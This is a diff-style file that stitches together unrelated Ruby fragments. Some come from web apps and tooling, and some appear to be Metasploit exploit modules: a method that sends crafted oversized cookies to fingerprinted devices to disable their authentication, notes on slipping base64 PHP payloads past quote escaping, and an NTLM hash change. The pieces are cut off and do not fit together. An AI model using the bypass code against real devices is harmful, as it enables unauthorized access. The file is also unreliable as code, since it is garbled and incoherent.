@@ -1,113 +1,161 @@
 
         
-              desc 'Get the list of the available template' do
-        detail 'This feature was introduced in GitLab #{gitlab_version}.'
-        success Entities::TemplatesList
-      end
-      params do
-        use :pagination
-      end
-      get 'templates/#{template_type}' do
-        templates = ::Kaminari.paginate_array(TemplateFinder.build(template_type, nil).execute)
-        present paginate(templates), with: Entities::TemplatesList
-      end
+            # PHP escapes quotes by default with magic_quotes_gpc, so we use some
+    # tricks to get around using them.
+    #
+    # The raw, unquoted base64 without the terminating equals works because
+    # PHP treats it like a string.  There are, however, a couple of caveats
+    # because first, PHP tries to parse the bare string as a constant.
+    # Because of this, the string is limited to things that can be
+    # identifiers, i.e., things that start with [a-zA-Z] and contain only
+    # [a-zA-Z0-9_].  Also, for payloads that encode to more than 998
+    # characters, only part of the payload gets unencoded on the victim,
+    # presumably due to a limitation in PHP identifier name lengths, so we
+    # break the encoded payload into roughly 900-byte chunks.
+    #
+    # https://wiki.php.net/rfc/deprecate-bareword-strings
     
-          def decoded
-        secret =
-          case options.algorithm
-          when *%w[RS256 RS384 RS512]
-            OpenSSL::PKey::RSA.new(options.secret).public_key
-          when *%w[ES256 ES384 ES512]
-            OpenSSL::PKey::EC.new(options.secret).tap { |key| key.private_key = nil }
-          when *%w(HS256 HS384 HS512)
-            options.secret
+      #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
+  end
+    
+      def run
+    res = send_request_raw(
+        'uri' => normalize_uri(target_uri.path.to_s),
+        'method' => 'GET',
+    )
+    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)
+    if model != Exploit::CheckCode::Detected
+      devices = devices_list[model.to_sym]
+      devices = devices_list['ALL'.to_sym] if devices.nil? && datastore['ForceAttempt']
+      if devices != nil
+        print_good('Detected device:#{devices[:name]} #{devices[:model]}')
+        devices[:values].each { |value|
+          cookie = 'C#{value[0]}=#{'B'*value[1]}\x00'
+          res = send_request_raw(
+              'uri' => normalize_uri(target_uri.path.to_s),
+              'method' => 'GET',
+              'headers' => headers.merge('Cookie' => cookie)
+          )
+          if res != nil and res.code <= 302
+            print_good('Good response, please check host, authentication should be disabled')
+            break
           else
-            raise NotImplementedError, 'Unsupported algorithm: #{options.algorithm}'
+            print_error('Bad response')
           end
-    
-          diff_file = subject.diff_files.find { |file| file.new_path == stub_path }
-    
-        def to_a
-      @filters.dup
-    end
-    
-        def parse_as_fragment
-      Nokogiri::HTML.fragment @content, 'UTF-8'
+        }
+      else
+        print_error('No matching values for fingerprint #{model}')
+      end
+    else
+      print_error('Unknown device')
     end
   end
 end
 
     
-            title = at_css('h1').content.strip
-        if root_page?
-          at_css('h1').content = 'Angular 2 Documentation'
-        elsif title == 'Index'
-          at_css('h1').content = result[:entries].first.name
-        elsif title == 'Angular'
-          at_css('h1').content = slug.split('/').last.gsub('-', ' ')
-        elsif at_css('.breadcrumbs') && title != result[:entries].first.name
-          at_css('h1').content = result[:entries].first.name
-        end
+        vars_get = {'value' => go_go_gadget2}
     
-          def get_type
-        if slug.start_with?('guide/')
-          'Guide'
-        elsif slug.start_with?('cookbook/')
-          'Cookbook'
-        elsif slug == 'glossary'
-          'Guide'
-        else
-          type = at_css('.nav-title.is-selected').content.strip
-          type.remove! ' Reference'
-          type << ': #{mod}' if mod
-          type
-        end
+          if result[:success] == true
+        print_good('Success! New NTLM hash: #{result[:new]}')
+      else
+        print_error('Failed! #{result[:error]}')
       end
+    end
+  end
     
-            def to_s(states: %i(added deleted changed unchanged))
-          lines(states).join('\n')
-        end
-    
-                # support user custom paths of Pods group and xcconfigs files.
-            group_path = Pathname.new(group.real_path)
-            xcconfig_path = Pathname.new(pod_bundle.xcconfig_path(config.name))
-            path = xcconfig_path.relative_path_from(group_path)
-    
-    # It is very likely that we'll need these and as some of those paths will atm
-# result in a I18n deprecation warning, we load those here now so that we can
-# get rid of that warning.
-require 'active_support/core_ext/string/strip'
-require 'active_support/core_ext/string/inflections'
-require 'active_support/core_ext/array/conversions'
-# TODO: check what this actually does by the time we're going to add support for
-# other locales.
-require 'i18n'
-if I18n.respond_to?(:enforce_available_locales=)
-  I18n.enforce_available_locales = false
-end
-    
-        before do
-      @sut.any_instance.stubs(:configure_template)
+        if sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86
+      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
+    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64
+      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
     end
     
-        def render(context)
-      if @img
-        '<img #{@img.collect {|k,v| '#{k}=\'#{v}\'' if v}.join(' ')}>'
-      else
-        'Error processing input, expected syntax: {% img [class name(s)] [http[s]:/]/path/to/image [width [height]] [title text | \'title text\' [\'alt text\']] %}'
+          spec['version'] = Bootstrap::VERSION
+    
+      def initialize(repo: 'twbs/bootstrap', branch: 'master', save_to: {}, cache_path: 'tmp/converter-cache-bootstrap')
+    @logger     = Logger.new
+    @repo       = repo
+    @branch     = branch || 'master'
+    @branch_sha = get_branch_sha
+    @cache_path = cache_path
+    @repo_url   = 'https://github.com/#@repo'
+    @save_to    = {
+        js:    'assets/javascripts/bootstrap',
+        scss:  'assets/stylesheets/bootstrap',
+        fonts: 'assets/fonts/bootstrap'}.merge(save_to)
+  end
+    
+      # The test environment is used exclusively to run your application's
+  # test suite. You never need to work with it otherwise. Remember that
+  # your test database is 'scratch space' for the test suite and is wiped
+  # and recreated between test runs. Don't rely on the data there!
+  config.cache_classes = true
+    
+    require 'clamp'
+require 'pluginmanager/util'
+require 'pluginmanager/gemfile'
+require 'pluginmanager/install'
+require 'pluginmanager/remove'
+require 'pluginmanager/list'
+require 'pluginmanager/update'
+require 'pluginmanager/pack'
+require 'pluginmanager/unpack'
+require 'pluginmanager/generate'
+require 'pluginmanager/prepare_offline_pack'
+require 'pluginmanager/proxy_support'
+configure_proxy
+    
+        context 'when is not a system pipeline' do
+      it 'returns false if the pipeline is not a system pipeline' do
+        expect(subject.system?).to be_falsey
       end
     end
   end
 end
+
     
-      class RenderPartialTag < Liquid::Tag
-    include OctopressFilters
-    def initialize(tag_name, markup, tokens)
-      @file = nil
-      @raw = false
-      if markup =~ /^(\S+)\s?(\w+)?/
-        @file = $1.strip
-        @raw = $2 == 'raw'
+      action :raw do
+    title 'Send a raw RFC2882 message'
+    description 'This action allows you to send us a raw RFC2822 formatted message along with the recipients that it should be sent to. This is similar to sending a message through our SMTP service.'
+    param :mail_from, 'The address that should be logged as sending the message', :type => String, :required => true
+    param :rcpt_to, 'The addresses this message should be sent to', :type => Array, :required => true
+    param :data, 'A base64 encoded RFC2822 message to send', :type => String, :required => true
+    param :bounce, 'Is this message a bounce?', :type => :boolean
+    returns Hash
+    error 'UnauthenticatedFromAddress', 'The From address is not authorised to send mail from this server'
+    action do
+      # Decode the raw message
+      raw_message = Base64.decode64(params.data)
+    
       end
-      super
+end
+
+    
+      def create
+    @ip_address = @ip_pool.ip_addresses.build(safe_params)
+    if @ip_address.save
+      redirect_to_with_json [:edit, @ip_pool]
+    else
+      render_form_errors 'new', @ip_address
     end
+  end
+    
+      def framework_version
+    @framework_version ||= `rails -v`[/^Rails (.+)$/, 1]
+  end
+    
+            def define_boolean_in_mod(mod)
+          return if defined? mod::Boolean
+          mod.const_set('Boolean', Virtus::Attribute::Boolean)
+        end
+    
+          # @param key [Symbol]
+      # @param value [Object]
+      # @return (see #get_or_set)
+      def global_setting(key, value = nil)
+        get_or_set :global, key, value
+      end
